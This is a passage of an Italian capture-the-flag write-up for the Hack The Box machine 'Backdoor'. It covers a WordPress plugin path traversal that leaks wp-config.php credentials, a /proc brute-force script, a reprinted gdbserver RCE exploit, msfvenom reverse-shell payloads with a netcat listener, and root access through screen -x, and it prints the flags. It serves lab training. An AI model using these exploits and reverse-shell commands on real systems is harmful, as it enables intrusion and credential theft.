Tuttavia, andando in una cartella indietro possiamo vedere che c'è la possibilità di accedere a <code>.../ebook-download</code>.
Dunque, si tratta del plugin <b><b>ebook</b></b>. Leggiamo il file <code>readme.txt</code> per vedere se è presente la versione del plugin e cercare vulnerabilià.
</p>
<pre class="example">
=== Plugin Name ===
Contributors: zedna
Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&amp;business=3ZVGZTC7ZPCH2&amp;lc=CZ&amp;item_name=Zedna%20Brickick%20Website&amp;currency_code=USD&amp;bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
Tags: ebook, file, download
Requires at least: 3.0.4
Tested up to: 4.4
Stable tag: 1.1
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

Allow user to download your ebook custom file when insert an email.

== Description ==

Enable user to download your Ebook or other file after inserting his mail.

&lt;a href="https://sellfy.com/p/CCTK/" target="_blank"&gt;eBook download Pro&lt;/a&gt; features:
-social share for download
-pop-up window with download form
-download stats incoming

== Installation ==

1. Upload `ebook-download` folder to the `/wp-content/plugins/` directory
2. Activate the plugin through the 'Plugins' menu in WordPress
3. Add new ebook in `Ebook downloads`
4. Add widget `Ebook Download` to your widget area

== Frequently Asked Questions ==

= Can i share image with ebook? =
Yes, you can set thumbnail for you Ebook post.

= Which file types can i use? =
You can use whatever file type you can upload to wordpress.

= Can i insert custom file URL? =
Yes, you can insert external URL. 

 == Screenshots ==
1. Widget
2. Ebook post
3. Email list
4. Settings page

== Upgrade Notice ==
= 1.1 =
Built on WP 4.3 but can work on older versions

= 1.0 =
Built on WP 4.3 but can work on older versions

== Changelog ==
= 1.1 =

Fixed function call.

= 1.0 =
 First version
</pre>

<p>
La versione è la 1.0 e troviamo che è vulnerabile con **directory traversal (<a href="https://www.exploit-db.com/exploits/39575">link</a>).
</p>

<p>
Dunque, accediamo alla seguente directory:
<code>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</code>
</p>

<p>
Questo path ci permette di scaricare il file <b><b>wp-config.php</b></b> che può contenere delle credenziali.
</p>
<pre class="example" id="wp-config.php">
../../../wp-config.php../../../wp-config.php../../../wp-config.php&lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */

/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
define('ABSPATH', dirname(__FILE__) . '/');
/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */
$currenthost = "http://".$_SERVER['HTTP_HOST'];
$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));
$currentpath = preg_replace('/\/wp.+/','',$currentpath);
define('WP_HOME',$currenthost.$currentpath);
define('WP_SITEURL',$currenthost.$currentpath);
define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');
define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');
define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );
@define('ADMIN_COOKIE_PATH', './');

define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
&lt;script&gt;window.close()&lt;/script&gt; 
</pre>

<p>
Prendiamo le seguenti credenziali del database:
<b><b>wordpressuser:MQYBJSaD#DxG6qbm</b></b>
</p>

<p>
Vediamo inoltre che per le chiavi, si possono generare al link: <a href="https://wordpress.org/support/article/editing-wp-config-php/">https://wordpress.org/support/article/editing-wp-config-php/</a>
</p>

<p>
Nulla da fare, non è fattibile. Cerchiamo di exploitare la directory traversal per effettuare un LFI.
</p>
</div>
</div>
<div id="outline-container-orgb16cf2a" class="outline-4">
<h4 id="orgb16cf2a">LFI</h4>
<div class="outline-text-4" id="text-orgb16cf2a">
<p>
Cerchiamo di sfruttare la vulnerabilità per effettuare un LFI. Ho scritto il seguente script python:
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #2aa1ae; background-color: #292e34;">#</span><span style="color: #2aa1ae; background-color: #292e34;">!/usr/bin/python3</span>


<span style="color: #9f8766;">'''</span>
<span style="color: #9f8766;">This script aims to brute-force a site through LFI (Local File inclusion)</span>
<span style="color: #9f8766;">The path to bruteforce is /proc/[PID]/cmdline</span>
<span style="color: #9f8766;">'''</span>


<span style="color: #4f97d7; font-weight: bold;">import</span> requests
<span style="color: #4f97d7; font-weight: bold;">import</span> re

<span style="color: #7590db;">url</span> = <span style="color: #2d9574;">"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"</span>

<span style="color: #4f97d7; font-weight: bold;">for</span> i <span style="color: #4f97d7; font-weight: bold;">in</span> <span style="color: #4f97d7;">range</span> (1, 1000):
    <span style="color: #7590db;">trial</span> = url + <span style="color: #4f97d7;">str</span>(i) + <span style="color: #2d9574;">"/cmdline"</span>
    <span style="color: #7590db;">response</span> = requests.get(trial)
    <span style="color: #7590db;">response_length</span> = <span style="color: #4f97d7;">len</span>(response.content)

    <span style="color: #4f97d7; font-weight: bold;">if</span> (response_length &gt; 82):
        <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #2d9574;">"URL: "</span> + trial + <span style="color: #2d9574;">"\n"</span>)
        <span style="color: #4f97d7; font-weight: bold;">print</span>(re.split(<span style="color: #2d9574;">"/cmdline/"</span>, <span style="color: #4f97d7;">str</span>(response.content)))

        <span style="color: #4f97d7; font-weight: bold;">print</span> (<span style="color: #2d9574;">"\n-----------------------------------"</span>)
</pre>
</div>

<pre class="example" id="output">
-----------------------------------
URL: http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/987/cmdline

["b'/proc/987", 'proc/987', "proc/987/cmdlinebash\\x00-c\\x00cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\\x00&lt;script&gt;window.close()&lt;/script&gt;'"]
</pre>


<p>
Vediamo che c'è un <b><b>gdbserver</b></b> che runna dietro la porta 1337!!!
Cerchiamo delle vulnerabilità (RCE possibilmente).
</p>
</div>
</div>
</div>
<div id="outline-container-org2697696" class="outline-3">
<h3 id="org2697696">gdbserver</h3>
<div class="outline-text-3" id="text-org2697696">
</div>
<div id="outline-container-org74ae6e4" class="outline-4">
<h4 id="org74ae6e4">Exploit</h4>
<div class="outline-text-4" id="text-org74ae6e4">
<p>
Ho trovato su <code>exploit-db</code> il seguente exploit che richiede l'uso di msfvenom per generare del payload e ottenere
una <b><b>reverse shell</b></b>.
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)</span>
<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Date: 2021-11-21</span>
<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Exploit Author: Roberto Gesteira Mi&#241;arro (7Rocky)</span>
<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Vendor Homepage: https://www.gnu.org/software/gdb/</span>
<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Software Link: https://www.gnu.org/software/gdb/download/</span>
<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2</span>
<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)</span>

<span style="color: #2aa1ae; background-color: #292e34;">#</span><span style="color: #2aa1ae; background-color: #292e34;">!/usr/bin/env python3</span>


<span style="color: #4f97d7; font-weight: bold;">import</span> binascii
<span style="color: #4f97d7; font-weight: bold;">import</span> socket
<span style="color: #4f97d7; font-weight: bold;">import</span> struct
<span style="color: #4f97d7; font-weight: bold;">import</span> sys

<span style="color: #4f97d7;">help</span> = f<span style="color: #2d9574;">'''</span>
<span style="color: #2d9574;">Usage: python3 {sys.argv[0]} &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;</span>

<span style="color: #2d9574;">Example:</span>
<span style="color: #2d9574;">- Victim's gdbserver   -&gt;  10.10.10.200:1337</span>
<span style="color: #2d9574;">- Attacker's listener  -&gt;  10.10.10.100:4444</span>

<span style="color: #2d9574;">1. Generate shellcode with msfvenom:</span>
<span style="color: #2d9574;">$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin</span>

<span style="color: #2d9574;">2. Listen with Netcat:</span>
<span style="color: #2d9574;">$ nc -nlvp 4444</span>

<span style="color: #2d9574;">3. Run the exploit:</span>
<span style="color: #2d9574;">$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin</span>
<span style="color: #2d9574;">'''</span>


<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">checksum</span>(s: <span style="color: #4f97d7;">str</span>) -&gt; <span style="color: #4f97d7;">str</span>:
    <span style="color: #7590db;">res</span> = <span style="color: #4f97d7;">sum</span>(<span style="color: #4f97d7;">map</span>(<span style="color: #4f97d7;">ord</span>, s)) % 256
    <span style="color: #4f97d7; font-weight: bold;">return</span> f<span style="color: #2d9574;">'{res:2x}'</span>


<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">ack</span>(sock):
    sock.send(b<span style="color: #2d9574;">'+'</span>)


<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">send</span>(sock, s: <span style="color: #4f97d7;">str</span>) -&gt; <span style="color: #4f97d7;">str</span>:
    sock.send(f<span style="color: #2d9574;">'${s}#{checksum(s)}'</span>.encode())
    <span style="color: #7590db;">res</span> = sock.recv(1024)
    ack(sock)
    <span style="color: #4f97d7; font-weight: bold;">return</span> res.decode()


<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">exploit</span>(sock, payload: <span style="color: #4f97d7;">str</span>):
    send(sock, <span style="color: #2d9574;">'qSupported:multiprocess+;qRelocInsn+;qvCont+;'</span>)
    send(sock, <span style="color: #2d9574;">'!'</span>)

    <span style="color: #4f97d7; font-weight: bold;">try</span>:
        <span style="color: #7590db;">res</span> = send(sock, <span style="color: #2d9574;">'vCont;s'</span>)
        <span style="color: #7590db;">data</span> = res.split(<span style="color: #2d9574;">';'</span>)[2]
        <span style="color: #7590db;">arch</span>, <span style="color: #7590db;">pc</span> = data.split(<span style="color: #2d9574;">':'</span>)
    <span style="color: #4f97d7; font-weight: bold;">except</span> <span style="color: #ce537a; font-weight: bold;">Exception</span>:
        <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #2d9574;">'[!] ERROR: Unexpected response. Try again later'</span>)
        <span style="color: #a45bad;">exit</span>(1)

    <span style="color: #4f97d7; font-weight: bold;">if</span> arch == <span style="color: #2d9574;">'10'</span>:
        <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #2d9574;">'[+] Found x64 arch'</span>)
        <span style="color: #7590db;">pc</span> = binascii.unhexlify(pc[:pc.index(<span style="color: #2d9574;">'0*'</span>)])
        <span style="color: #7590db;">pc</span> += b<span style="color: #2d9574;">'\0'</span> * (8 - <span style="color: #4f97d7;">len</span>(pc))
        <span style="color: #7590db;">addr</span> = <span style="color: #4f97d7;">hex</span>(struct.unpack(<span style="color: #2d9574;">'&lt;Q'</span>, pc)[0])[2:]
        <span style="color: #7590db;">addr</span> = <span style="color: #2d9574;">'0'</span> * (16 - <span style="color: #4f97d7;">len</span>(addr)) + addr
    <span style="color: #4f97d7; font-weight: bold;">elif</span> arch == <span style="color: #2d9574;">'08'</span>:
        <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #2d9574;">'[+] Found x86 arch'</span>)
        <span style="color: #7590db;">pc</span> = binascii.unhexlify(pc)
        <span style="color: #7590db;">pc</span> += b<span style="color: #2d9574;">'\0'</span> * (4 - <span style="color: #4f97d7;">len</span>(pc))
        <span style="color: #7590db;">addr</span> = <span style="color: #4f97d7;">hex</span>(struct.unpack(<span style="color: #2d9574;">'&lt;I'</span>, pc)[0])[2:]
        <span style="color: #7590db;">addr</span> = <span style="color: #2d9574;">'0'</span> * (8 - <span style="color: #4f97d7;">len</span>(addr)) + addr

    <span style="color: #7590db;">hex_length</span> = <span style="color: #4f97d7;">hex</span>(<span style="color: #4f97d7;">len</span>(payload))[2:]

    <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #2d9574;">'[+] Sending payload'</span>)
    send(sock, f<span style="color: #2d9574;">'M{addr},{hex_length}:{payload}'</span>)
    send(sock, <span style="color: #2d9574;">'vCont;c'</span>)


<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">main</span>():
    <span style="color: #4f97d7; font-weight: bold;">if</span> <span style="color: #4f97d7;">len</span>(sys.argv) &lt; 3:
        <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #4f97d7;">help</span>)
        <span style="color: #a45bad;">exit</span>(1)

    <span style="color: #7590db;">ip</span>, <span style="color: #7590db;">port</span> = sys.argv[1].split(<span style="color: #2d9574;">':'</span>)
    <span style="color: #4f97d7;">file</span> = sys.argv[2]

    <span style="color: #4f97d7; font-weight: bold;">try</span>:
        <span style="color: #4f97d7; font-weight: bold;">with</span> <span style="color: #4f97d7;">open</span>(<span style="color: #4f97d7;">file</span>, <span style="color: #2d9574;">'rb'</span>) <span style="color: #4f97d7; font-weight: bold;">as</span> f:
            <span style="color: #7590db;">payload</span> = f.read().<span style="color: #4f97d7;">hex</span>()
    <span style="color: #4f97d7; font-weight: bold;">except</span> <span style="color: #ce537a; font-weight: bold;">FileNotFoundError</span>:
        <span style="color: #4f97d7; font-weight: bold;">print</span>(f<span style="color: #2d9574;">'[!] ERROR: File {file} not found'</span>)
        <span style="color: #a45bad;">exit</span>(1)

    <span style="color: #4f97d7; font-weight: bold;">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span style="color: #4f97d7; font-weight: bold;">as</span> sock:
        sock.connect((ip, <span style="color: #4f97d7;">int</span>(port)))
        <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #2d9574;">'[+] Connected to target. Preparing exploit'</span>)
        exploit(sock, payload)
        <span style="color: #4f97d7; font-weight: bold;">print</span>(<span style="color: #2d9574;">'[*] Pwned!! Check your listener'</span>)


<span style="color: #4f97d7; font-weight: bold;">if</span> <span style="color: #4f97d7;">__name__</span> == <span style="color: #2d9574;">'__main__'</span>:
    main()

</pre>
</div>

<p>
Non funziona, ma proviamo ad interagire direttamente con <code>gdb</code>.
</p>
</div>
</div>
<div id="outline-container-org79c334a" class="outline-4">
<h4 id="org79c334a">gdb</h4>
<div class="outline-text-4" id="text-org79c334a">
<p>
Sfruttiamo quanto trovato al seguente <a href="https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver">link</a>.
</p>
<pre class="example">
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.48 LPORT=4444 PrependFork=true -f elf -o rev.elf                                                                                
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: rev.elf
</pre>

<pre class="example">
gdb rev.elf                                                                                   
GNU gdb (Debian 10.1-2+b1) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from rev.elf...
(No debugging symbols found in rev.elf)
(gdb) target extended-remote 10.10.11.125:1337
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
(gdb) remote set rev.elf rev.elf
Undefined remote command: "set rev.elf rev.elf".  Try "help remote".
(gdb) remote put rev.elf rev.elf
Successfully sent file "rev.elf".
(gdb) set remote exec-file /home/user/rev.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /home/user/rev.elf from remote target...
Reading /home/user/rev.elf from remote target...
Reading symbols from target:/home/user/rev.elf...
(No debugging symbols found in target:/home/user/rev.elf)
[Detaching after fork from child process 9983]
[Inferior 1 (process 9956) exited normally]
(gdb) target extended-remote 10.10.11.125:1337
</pre>

<p>
E abbiamo ottenuto una <b><b>Reverse Shell</b></b>
</p>
<pre class="example">
nc -lvnp 4444                                                                                 
listening on [any] 4444 ...
connect to [10.10.16.48] from (UNKNOWN) [10.10.11.125] 38848
whoami
user
which python
which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
user@Backdoor:/home/user$
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-org00b2587" class="outline-2">
<h2 id="org00b2587">Privilege Escalation</h2>
<div class="outline-text-2" id="text-org00b2587">
</div>
<div id="outline-container-org1d75f35" class="outline-3">
<h3 id="org1d75f35">user</h3>
<div class="outline-text-3" id="text-org1d75f35">
</div>
<div id="outline-container-orgc1a388a" class="outline-4">
<h4 id="orgc1a388a">user flag</h4>
<div class="outline-text-4" id="text-orgc1a388a">
<p>
user.txt: 6524dc53a2680decd5ccca3101329b88
</p>
</div>
</div>
<div id="outline-container-org5ce208a" class="outline-4">
<h4 id="org5ce208a">mysql</h4>
<div class="outline-text-4" id="text-org5ce208a">
<pre class="example">
mysql&gt; select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | admin      | $P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5. | admin         | admin@wordpress.com | http://backdoor.htb | 2021-07-24 13:19:11 | 1650312723:$P$BHwU9Aw94E6dnWvqHh/Pi/HGV3vT3Q1 |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
1 row in set (0.00 sec)

</pre>
<p>
Ma non è utile.
</p>
</div>
</div>
<div id="outline-container-org936a0f3" class="outline-4">
<h4 id="org936a0f3">linpeas</h4>
<div class="outline-text-4" id="text-org936a0f3">
<pre class="example">
root         860  0.0  0.1   8356  3404 ?        S    19:07   0:00  _ /usr/sbin/CRON -f
root         885  0.0  0.0   2608  1760 ?        Ss   19:07   0:01      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
root       35493  0.0  0.0   5476   592 ?        S    20:30   0:00          _ sleep 1

</pre>

<pre class="example">
user        2081  0.0  0.2   8364  4712 pts/1    Ss   19:12   0:00      _ /bin/bash
root        6908  0.0  0.1   7048  2864 pts/1    S+   19:43   0:00          _ screen -x root root
root        5912  0.0  0.1   7084  2672 ?        Ss   19:37   0:00 SCREEN -dmS root

</pre>

<p>
Viene segnalata una vulnerabilità di <b><b>screen</b></b> che runna come un <b><b>cronjob</b></b> da root.
La vulnerabilità consiste nell'opzione <b><b>-x</b></b> di screen che permette di attaccarsi ad uno screen non detached.
E, come visto, ce n'è uno che runna da root con cronjob.
</p>
</div>
</div>

<div id="outline-container-org8ecc33c" class="outline-4">
<h4 id="org8ecc33c">exploit screen -x</h4>
<div class="outline-text-4" id="text-org8ecc33c">
<pre class="example">
screen -x root/root
No terminal attached
echo $TERM
dumb
export TERM=xterm
screen -x root/root
</pre>
</div>
</div>
</div>

<div id="outline-container-org65db2c7" class="outline-3">
<h3 id="org65db2c7">root</h3>
<div class="outline-text-3" id="text-org65db2c7">
<pre class="example">
root@Backdoor:~# cat root.txt
82c2bc8ce79b5a4bb34bf4aecde184ba
</pre>
</div>
<ul class="org-ul">
<li><a id="orgd6972e1"></a>root flag<br />
<div class="outline-text-5" id="text-orgd6972e1">
<pre class="example">
root.txt:82c2bc8ce79b5a4bb34bf4aecde184ba     
</pre>
</div>
</li>
</ul>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="date">Date: 18/04/2022</p>
<p class="author">Author: Andrea Pepe</p>
<p class="date">Created: 2022-04-21 gio 09:43</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
